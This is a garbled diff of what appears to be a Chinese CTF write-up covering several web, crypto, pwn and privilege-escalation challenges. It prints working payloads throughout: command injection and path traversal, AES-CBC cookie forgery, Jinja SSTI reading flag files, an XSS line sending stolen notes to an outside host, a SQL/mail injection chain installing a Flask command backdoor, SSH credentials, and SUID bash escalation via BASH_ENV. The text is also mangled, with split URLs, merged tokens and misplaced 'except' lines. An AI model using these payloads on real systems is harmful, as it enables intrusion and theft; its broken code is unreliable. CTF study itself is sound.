@@ -47,12 +47,14 @@ def login():
         <h2>No need to register.</h2>
         <form action="/login" method="post">
             <label for="username">Username:</label>
-            <input type="text" id="username" name="username" required>
-            <br>
+            
+            
+
             <label for="password">Password:</label>
-            <input type="password" id="password" name="password" required>
-            <br>
-            <input type="submit" value="Login">
+            
+            
+
+            
         </form>
         '''
 
@@ -73,8 +75,8 @@ def upload():
             <h1>Upload Image</h1>
             
             <form action="/upload" method="post" enctype="multipart/form-data">
-                <input type="file" name="file">
-                <input type="submit" value="Upload">
+                
+                
             </form>
             '''
             
@@ -84,11 +86,11 @@ def upload():
                 with open(file_path, 'rb') as f:
                     content = f.read()
                     b64 = base64.b64encode(content)
-                    returnf'<img src="data:image/png;base64,{b64.decode()}" alt="Uploaded Image">'
+                    returnf''
             else:
                 os.system(f'base64 {file_path} > /tmp/{file_path}.b64')
                 # with open(f'/tmp/{file_path}.b64', 'r') as f:
-                #     return f'<img src="data:image/png;base64,{f.read()}" alt="Uploaded Image">'
+                #     return f''
                 return'Sorry, but you are not allowed to view this image.'
                 
 if __name__ == '__main__':
@@ -141,7 +143,8 @@ def validate_cookie(cookie: str) -> bool:
 
     try:
         cookie_encrypted = base64.b64decode(cookie, validate=True)
-    except binascii.Error:
+    
+except binascii.Error:
         returnFalse
 
     if len(cookie_encrypted) < 32:
@@ -151,12 +154,14 @@ def validate_cookie(cookie: str) -> bool:
         iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
         cipher = AES.new(KEY, AES.MODE_CBC, iv)
         cookie_json = cipher.decrypt(padded)
-    except ValueError:
+    
+except ValueError:
         returnFalse
 
     try:
         _ = json.loads(cookie_json)
-    except Exception:
+    
+except Exception:
         returnFalse
 
     returnTrue
@@ -167,7 +172,8 @@ def parse_cookie(cookie: str) -> Tuple[bool, str]:
 
     try:
         cookie_encrypted = base64.b64decode(cookie, validate=True)
-    except binascii.Error:
+    
+except binascii.Error:
         returnFalse, ""
 
     if len(cookie_encrypted) < 32:
@@ -179,12 +185,14 @@ def parse_cookie(cookie: str) -> Tuple[bool, str]:
         decrypted = cipher.decrypt(padded)
         cookie_json_bytes = unpad(decrypted, 16)
         cookie_json = cookie_json_bytes.decode()
-    except ValueError:
+    
+except ValueError:
         returnFalse, ""
 
     try:
         cookie_dict = json.loads(cookie_json)
-    except Exception:
+    
+except Exception:
         returnFalse, ""
 
     returnTrue, cookie_dict.get("name")
@@ -255,18 +263,18 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">Welcome, %s !</h2>
-        <div class="text-center">
+        
             Your payload: %s
-        </div>
-        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """ % (
             current_username,
@@ -284,19 +292,19 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">server code (encoded)</h2>
-        <div class="text-center" style="word-break:break-all;">
+        
         {%% raw %%}
             %s
         {%% endraw %%}
-        </div>
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """
             % base64.b64encode(open(__file__, "rb").read()).decode()
@@ -388,12 +396,14 @@ def parse_cookie(cookie_b64: str) -> Tuple[bool, str]:
 
     try:
         cookie = base64.b64decode(cookie_b64, validate=True).decode()
-    except binascii.Error:
+    
+except binascii.Error:
         returnFalse, ""
 
     try:
         msg_str, sig_hex = cookie.split("&")
-    except Exception:
+    
+except Exception:
         returnFalse, ""
 
     msg_dict = json.loads(msg_str)
@@ -403,7 +413,8 @@ def parse_cookie(cookie_b64: str) -> Tuple[bool, str]:
     try:
         PKCS1_v1_5.new(public_key).verify(msg_hash, sig)
         valid = True
-    except (ValueError, TypeError):
+    
+except (ValueError, TypeError):
         valid = False
     return valid, msg_dict.get("user_name")
 
@@ -479,18 +490,18 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">Welcome, %s !</h2>
-        <div class="text-center">
+        
             Your payload: %s
-        </div>
-        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """ % (
             current_username,
@@ -508,19 +519,19 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">server code (encoded)</h2>
-        <div class="text-center" style="word-break:break-all;">
+        
         {%% raw %%}
             %s
         {%% endraw %%}
-        </div>
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """
             % base64.b64encode(open(__file__, "rb").read()).decode()
@@ -570,7 +581,8 @@ u0000
 The scene has expired, please re found it？ 攻防世界平台出问题了
 凑活用吧先：
 
-http://36.134.115.149:3000/
+http://36.134.115.149:
+3000/
 
 title=a&format=rst&content=..+include%3a%3a+/etc/passwd可以读文件，但是flag.txt被删了
 
@@ -597,7 +609,8 @@ async function visit(url) {
     })
     let page = await browser.newPage()
 
-    await page.goto('http://localhost:3000/')
+    await page.goto('http://localhost:
+3000/')
 
     await page.waitForSelector('#title')
     await page.type('#title', 'flag', {delay: 100})
@@ -612,9 +625,12 @@ async function visit(url) {
     await browser.close()
 }
 
-通过js伪协议打XSS将nots外带，然后获取note/:noteId中的flag
+通过js伪协议打XSS将nots外带，然后获取note/:
+noteId中的flag
 
-javascript:fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:port/',d))
+javascript:
+fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:
+port/',d))
 
 注：这题真有够逆天的2333，samesite居然默认是None。出题人也不验题）
 
@@ -624,15 +640,19 @@ mail injection+sql injection+SSTI
 
 import requests
 import time
-url = "http://223.112.5.141:56309"
+url = "http://223.112.5.141:
+56309"
 
 evil = 'FROM "admin@ezmail.org"'
 
 def report():
-    content = """{{url_for.__globals__.__builtins__["eval"]("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\"cmd\") and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)",{"request":url_for.__globals__["request"],"app":g.pop.__globals__.sys.modules["__main__"].app})}}""".replace("'","''")
-    subject="http://ezmail.org:3000/news?id=0 union select '"+content+"'"
+    content = """{{url_for.__globals__.__builtins__["eval"]("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\"cmd\") and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)",{"request":
+url_for.__globals__["request"],"app":g.pop.__globals__.sys.modules["__main__"].app})}}""".replace("'","''")
+    subject="http://ezmail.org:
+3000/news?id=0 union select '"+content+"'"
     data = {
-        # "url": 'http://ezmail.org:3000/rnrn1234rn.rn'+f'From: admin@ezmail.orgrnTo: admin@ezmail.orgrnSubject: {subject}',
+        # "url": 'http://ezmail.org:
+3000/rnrn1234rn.rn'+f'From: admin@ezmail.orgrnTo: admin@ezmail.orgrnSubject: {subject}',
         "url": subject+"rnFrom: admin@ezmail.org",
         "content": "1234"
     }
@@ -659,11 +679,14 @@ Easy的基本可以用谷歌识图，trace.moe得到结果
 
 Hard，前两个可能不确定，使用ChatGPT识别的
 
-hard_2:Pokssak Sogatsuda，抖音识图
+hard_2:
+Pokssak Sogatsuda，抖音识图
 
-hard_3:Awaara, 观察图片似乎有穆斯林的帽子，推测是印度电影
+hard_3:
+Awaara, 观察图片似乎有穆斯林的帽子，推测是印度电影
 
-hard_4:Psiconautas, los niños olvidados，谷歌识图，蜘蛛是其中的角色
+hard_4:
+Psiconautas, los niños olvidados，谷歌识图，蜘蛛是其中的角色
 
 QQQRcode
 
@@ -733,12 +756,14 @@ def login():
         <h2>No need to register.</h2>
         <form action="/login" method="post">
             <label for="username">Username:</label>
-            <input type="text" id="username" name="username" required>
-            <br>
+            
+            
+
             <label for="password">Password:</label>
-            <input type="password" id="password" name="password" required>
-            <br>
-            <input type="submit" value="Login">
+            
+            
+
+            
         </form>
         '''
 
@@ -759,8 +784,8 @@ def upload():
             <h1>Upload Image</h1>
             
             <form action="/upload" method="post" enctype="multipart/form-data">
-                <input type="file" name="file">
-                <input type="submit" value="Upload">
+                
+                
             </form>
             '''
             
@@ -770,27 +795,17 @@ def upload():
                 with open(file_path, 'rb') as f:
                     content = f.read()
                     b64 = base64.b64encode(content)
-                    returnf'<img src="data:image/png;base64,{b64.decode()}" alt="Uploaded Image">'
+                    returnf''
             else:
                 os.system(f'base64 {file_path} > /tmp/{file_path}.b64')
                 # with open(f'/tmp/{file_path}.b64', 'r') as f:
-                #     return f'<img src="data:image/png;base64,{f.read()}" alt="Uploaded Image">'
+                #     return f''
                 return'Sorry, but you are not allowed to view this image.'
                 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-```
-
-
-
-```
 file_path=; ls / > /tmp/aaa #
 file_path=../../../../Fl4g_is_H3r3
-```
-
-
-
-```
 import base64, json, time
 import os, sys, binascii
 from dataclasses import dataclass, asdict
@@ -829,7 +844,8 @@ def validate_cookie(cookie: str) -> bool:
 
     try:
         cookie_encrypted = base64.b64decode(cookie, validate=True)
-    except binascii.Error:
+    
+except binascii.Error:
         returnFalse
 
     if len(cookie_encrypted) < 32:
@@ -839,12 +855,14 @@ def validate_cookie(cookie: str) -> bool:
         iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
         cipher = AES.new(KEY, AES.MODE_CBC, iv)
         cookie_json = cipher.decrypt(padded)
-    except ValueError:
+    
+except ValueError:
         returnFalse
 
     try:
         _ = json.loads(cookie_json)
-    except Exception:
+    
+except Exception:
         returnFalse
 
     returnTrue
@@ -855,7 +873,8 @@ def parse_cookie(cookie: str) -> Tuple[bool, str]:
 
     try:
         cookie_encrypted = base64.b64decode(cookie, validate=True)
-    except binascii.Error:
+    
+except binascii.Error:
         returnFalse, ""
 
     if len(cookie_encrypted) < 32:
@@ -867,12 +886,14 @@ def parse_cookie(cookie: str) -> Tuple[bool, str]:
         decrypted = cipher.decrypt(padded)
         cookie_json_bytes = unpad(decrypted, 16)
         cookie_json = cookie_json_bytes.decode()
-    except ValueError:
+    
+except ValueError:
         returnFalse, ""
 
     try:
         cookie_dict = json.loads(cookie_json)
-    except Exception:
+    
+except Exception:
         returnFalse, ""
 
     returnTrue, cookie_dict.get("name")
@@ -943,18 +964,18 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">Welcome, %s !</h2>
-        <div class="text-center">
+        
             Your payload: %s
-        </div>
-        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """ % (
             current_username,
@@ -972,19 +993,19 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">server code (encoded)</h2>
-        <div class="text-center" style="word-break:break-all;">
+        
         {%% raw %%}
             %s
         {%% endraw %%}
-        </div>
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """
             % base64.b64encode(open(__file__, "rb").read()).decode()
@@ -999,17 +1020,7 @@ def logout():
 
 if __name__ == "__main__":
     app.run()
-```
-
-
-
-```
 {"name": "admix", "password_raw": "password123", "register_time": 1714100000}
-```
-
-
-
-```
 import base64
 
 ciphertext = 'pcs0XLPoE/wf64KE3YYV6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw'
@@ -1022,17 +1033,7 @@ new_cookie = base64.b64encode(bytes(iv) + cipher).decode()
 print('Cipher:', new_cookie)
 
 # pcs0XLPoE/wf64KE3YYD6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw
-```
-
-
-
-```
 {{g.pop.__globals__.__builtins__['__import__']('os').popen('cat flag.txt').read()}}
-```
-
-
-
-```
 import base64, json, time
 import os, sys, binascii
 from dataclasses import dataclass, asdict
@@ -1084,12 +1085,14 @@ def parse_cookie(cookie_b64: str) -> Tuple[bool, str]:
 
     try:
         cookie = base64.b64decode(cookie_b64, validate=True).decode()
-    except binascii.Error:
+    
+except binascii.Error:
         returnFalse, ""
 
     try:
         msg_str, sig_hex = cookie.split("&")
-    except Exception:
+    
+except Exception:
         returnFalse, ""
 
     msg_dict = json.loads(msg_str)
@@ -1099,7 +1102,8 @@ def parse_cookie(cookie_b64: str) -> Tuple[bool, str]:
     try:
         PKCS1_v1_5.new(public_key).verify(msg_hash, sig)
         valid = True
-    except (ValueError, TypeError):
+    
+except (ValueError, TypeError):
         valid = False
     return valid, msg_dict.get("user_name")
 
@@ -1175,18 +1179,18 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">Welcome, %s !</h2>
-        <div class="text-center">
+        
             Your payload: %s
-        </div>
-        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """ % (
             current_username,
@@ -1204,19 +1208,19 @@ def home():
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
-<body>
-    <div class="container">
+
+    
         <h2 class="text-center">server code (encoded)</h2>
-        <div class="text-center" style="word-break:break-all;">
+        
         {%% raw %%}
             %s
         {%% endraw %%}
-        </div>
-        <div class="text-center">
-            <a href="/logout" class="btn btn-danger">Logout</a>
-        </div>
-    </div>
-</body>
+        
+        
+            [Logout](/logout)
+        
+    
+
 </html>
 """
             % base64.b64encode(open(__file__, "rb").read()).decode()
@@ -1231,18 +1235,8 @@ def logout():
 
 if __name__ == "__main__":
     app.run()
-```
-
-
-
-```
 if current_username == "admin":
         payload = request.args.get("payload")
-```
-
-
-
-```
 base_str = "eyJ1c2VyX25hbWUiOiAiYWRtaXgiLCAibG9naW5fdGltZSI6IDE3NDU2NTYxMjF9JjRlOGViNjZjNTNlN2E2YzQzYTY4MjNhZGQ0MjQwMzA0YjBlZjVhM2VmZTk5MzRjNWQ1ZTg1MGQ5NWRkN2M1M2Y4NTRmOGU0NjljYTQzYTM1Y2M3YTRhZGNhYWQwNDI0Nzc0NGY3Mjk3YjdjNjY3MjJhYTg2ODQ1YjQxYzUxYzliMjMzNjllNjFmYjE0ZWRhNjE4ODIxZDM3NzAyODA0ZmY2ZWI0M2U5ZjQzZmMwNTE0NzBjYWJkMTU4MTM0MmRmNzc1NGZjNDUzMDMyZWU2ZDgxOTRiNmM1NjNmNmRhNjBiN2RlMDExODc2ZTcxZWEyMGIyNjhkZDBlMWVlYTg0Yjk3MTcyNjI4NzA1ODk3NDYyNTI2Njk1NGQxZmY1OTc3MWM2Y2MwZjY5NzIzNDY2OWVkZWJlNDk2NmQ0OWVjN2E0NjgyZGE5NDI2MWI2ODYyZWU1ZDlmNjU4NDQ3NWMzY2U2YzdiMmZiNmE0YjM5Mzg4NzIyMDc1YjFlMmQ1MjA4MWFjYjBlY2JjYjk1YzlmOWI1MGU4ZmI0Zjk2NDA3MmIyM2E4NjBlMTRkNTE5OGYyNjJmYjVjOWZkZDZhNzYxYTQ2YWVlNTJlMDkzYTM0MGFiOTgzZGQ3MjU1N2I2YWEyYmYxMTM0N2NhN2Y3ZWQ0ZDQ3YTJiYjg1NDAzMmIzNzZi"
 origin = base64.b64decode(base_str)
 print(origin)
@@ -1250,31 +1244,11 @@ print(origin)
 # b'{"user_name": "admix", "login_time": 1745656121}&4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b'
 signature = '{"user_name": "admin", "login_time": 1745656121}&4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b'
 print(base64.b64encode(signature.encode()))
-```
-
-
-
-```
 {%set ia=lipsum|escape|batch(22)|first|last%}{%set gl=ia*2+"globals"+ia*2%}{%set bu=ia*2+"builtins"+ia*2%}{%set im=ia*2+"import"+ia*2%}{{g.pop[gl][bu][im]("os").popen("cat f*").read()}}
-```
-
-
-
-```
 如果未明确指定输入或输出格式，pandoc将尝试根据文件名的扩展名进行猜测。例如，
 pandoc -o hello.tex hello.txt
 将从 Markdown 转换hello.txt为 LaTeX。如果未指定输出文件（即输出到stdout），或者输出文件的扩展名未知，则输出格式将默认为 HTML。如果未指定输入文件（即输入来自stdin），或者输入文件的扩展名未知，则输入格式将被假定为 Markdown。
-```
-
-
-
-```
 u0000
-```
-
-
-
-```
 app.post('/report', async (req, res) => {
     let { url } = req.body
     try {
@@ -1285,11 +1259,6 @@ app.post('/report', async (req, res) => {
         res.send('error')
     }
 }
-```
-
-
-
-```
 async function visit(url) {
     let browser = await puppeteer.launch({
         headless: HEADLESS,
@@ -1298,7 +1267,8 @@ async function visit(url) {
     })
     let page = await browser.newPage()
 
-    await page.goto('http://localhost:3000/')
+    await page.goto('http://localhost:
+3000/')
 
     await page.waitForSelector('#title')
     await page.type('#title', 'flag', {delay: 100})
@@ -1312,28 +1282,24 @@ async function visit(url) {
     await sleep(30)
     await browser.close()
 }
-```
-
-
-
-```
-javascript:fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:port/',d))
-```
-
-
-
-```
+javascript:
+fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:
+port/',d))
 import requests
 import time
-url = "http://223.112.5.141:56309"
+url = "http://223.112.5.141:
+56309"
 
 evil = 'FROM "admin@ezmail.org"'
 
 def report():
-    content = """{{url_for.__globals__.__builtins__["eval"]("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\"cmd\") and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)",{"request":url_for.__globals__["request"],"app":g.pop.__globals__.sys.modules["__main__"].app})}}""".replace("'","''")
-    subject="http://ezmail.org:3000/news?id=0 union select '"+content+"'"
+    content = """{{url_for.__globals__.__builtins__["eval"]("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\"cmd\") and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)",{"request":
+url_for.__globals__["request"],"app":g.pop.__globals__.sys.modules["__main__"].app})}}""".replace("'","''")
+    subject="http://ezmail.org:
+3000/news?id=0 union select '"+content+"'"
     data = {
-        # "url": 'http://ezmail.org:3000/rnrn1234rn.rn'+f'From: admin@ezmail.orgrnTo: admin@ezmail.orgrnSubject: {subject}',
+        # "url": 'http://ezmail.org:
+3000/rnrn1234rn.rn'+f'From: admin@ezmail.orgrnTo: admin@ezmail.orgrnSubject: {subject}',
         "url": subject+"rnFrom: admin@ezmail.org",
         "content": "1234"
     }
@@ -1345,11 +1311,6 @@ requests.get(url+"/bot")
 
 req = requests.get(url+"/?cmd=cat /flag")
 print(f"flag:{req.text}")
-```
-
-
-
-```
 from pwn import *
 import re
 import hashlib
@@ -1590,11 +1551,6 @@ data = main()
 r.sendlineafter("give me your data:", data)
 
 r.interactive()
-```
-
-
-
-```
 Megumi19960923
 Megumi960923
 Megumi1996
@@ -1602,11 +1558,6 @@ Megumi0923
 Megumi199609
 Megumi09
 Megumi23
-```
-
-
-
-```
 $ find / -type f -perm -u=s 2>/dev/null                                                                                                                                                                                             
 /opt/hello                                                                                                                                                                                                                          
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                                                         
@@ -1620,19 +1571,9 @@ $ find / -type f -perm -u=s 2>/dev/null                           
 /bin/mount                                                                                                                                                                                                                          
 /bin/umount                                                                                                                                                                                                                         
 /bin/su
-```
-
-
-
-```
 ssh KatoMegumi@61.147.171.105  -p 55063
 Megumi960923
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-
-
-```
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
 char v4; // [rsp+Fh] [rbp-1h] BYREF
@@ -1667,24 +1608,9 @@ else
   }
 return0;
 }
-```
-
-
-
-```
 env $'BASH_FUNC_echo%%=() { id>/tmp/test; }' bash -c 'echo hello'
 env $'BASH_FUNC_echo%%=() { id; }' bash -p -c './hello<<<n'
-```
-
-
-
-```
 BASH_ENV='$(id 1>&2)' bash -c 'echo hello'
-```
-
-
-
-```
 echo "exec chmod +s /bin/bash" > /tmp/myhijack
 export BASH_ENV=/tmp/myhijack
 bash -p
